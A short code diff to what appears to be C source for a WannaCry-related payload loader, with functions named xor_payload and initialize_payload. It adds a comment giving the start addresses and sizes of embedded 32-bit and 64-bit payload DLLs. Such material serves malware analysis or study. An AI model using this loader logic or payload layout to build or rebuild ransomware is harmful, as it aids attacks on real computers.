@@ -29,6 +29,10 @@ int xor_payload(int xor_key, int buf, int size)
 //also here: https://www.acronis.com/en-us/blog/posts/wannacry-attack-what-it-and-how-protect-your-computer
 HGLOBAL initialize_payload()
 {
+	/*
+	32-bit dll start address 0x40B020, size is 0x4060 bytes
+	64-bit dll start address 0x40F080, size is 0xc8a4 bytes
+	*/
 	DWORD NumberOfBytesRead;
 	DWORD fileSize;
 	//size = 0x4060
